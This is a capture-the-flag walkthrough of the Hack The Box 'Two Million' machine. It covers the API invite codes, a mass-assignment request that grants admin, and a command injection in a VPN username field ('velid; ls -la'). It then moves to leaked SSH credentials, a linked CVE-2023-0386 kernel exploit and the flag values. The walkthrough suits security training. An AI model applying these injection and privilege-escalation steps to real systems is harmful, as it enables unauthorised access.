---
title: "HTB: Two Million"
author: "v3l1d"
date: "2024-08-05"
year: "2024"
---

![](attachment/d8433fa495034cedbcbde285f3a79d68.png)
```
 " # Nmap 7.94SVN scan initiated Sat Aug 10 10:26:58 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan 10.10.11.221
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.061s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```

![](attachment/cebd9713f29652a2953bbac2f2371ed1.png)
**Invite code generation

``` shell

┌──(kali㉿kali)-[~/HTB]

└─$ curl -X POST \

  http://2million.htb/api/v1/invite/generate \

  -H 'Content-Type: application/json' \

  -d '{}'

{"0":200,"success":1,"data":{"code":"N0VDWEYtQjFWU1UtVDNZSTktMTFMRFc=","format":"encoded"}}                                                                                                                                    

┌──(kali㉿kali)-[~/HTB]

└─$

┌──(kali㉿kali)-[~/HTB]

└─$ curl -X POST \

  http://2million.htb/api/v1/invite/generate \

  -H 'Content-Type: application/json' \

  -d '{}'

{"0":200,"success":1,"data":{"code":"SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=","format":"encoded"}}                                                                                                                              

┌──(kali㉿kali)-[~/HTB]

└─$ echo "SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=" | base64 -d          

HYJ9E-H3PSB-0HILZ-09HUU      

```

**APIs
```
HTTP/1.1 200 OK

Server: nginx

Date: Sun, 11 Aug 2024 12:01:01 GMT

Content-Type: application/json

Connection: keep-alive

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 800


{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```


![](attachment/a230cdbbd7bab9a39b58ad890523fe96.png)


Make a PUT request to /api/v1/admin/settings/update with
```

{
	"email": <youremail>,
	"is_admin": 1
}


```

```
POST /api/v1/admin/vpn/generate HTTP/1.1

Host: 2million.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Content-Type: application/json

Accept-Encoding: gzip, deflate, br

Referer: http://2million.htb/home

Connection: keep-alive

Cookie: PHPSESSID=bgo6jig411fj3nk8bciqfonpdo

Upgrade-Insecure-Requests: 1

Content-Length: 47





{

"username": "velid; ls -la "

}

-----------------------------------------------------------------

HTTP/1.1 200 OK

Server: nginx

Date: Sun, 11 Aug 2024 18:21:16 GMT

Content-Type: text/html; charset=UTF-8

Connection: keep-alive

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 690



total 56
drwxr-xr-x 10 root root 4096 Aug 11 18:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Aug 11 18:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views

------------------------------------------------------


```

Cat the .env file and 
![](attachment/76cd033960d09f1f9ebf70f4cbfa5501.png)


Log into ssh with credentials

```
ssh admin@10.10.11.221: SuperDuberPass123
```

![](attachment/0127d0b1827447c60fa7afec74c2f32b.png)

***
CVE Exploit
https://github.com/xkaneiki/CVE-2023-0386

This CVE will give you root access


![](attachment/3a2cb1f670e1d6bbaa01132a1090bf31.png)


**Flags

```
root:7dc68d17b543edb77d35bc192d63907a
user:f62e9b661ecc6002193860132292c635
```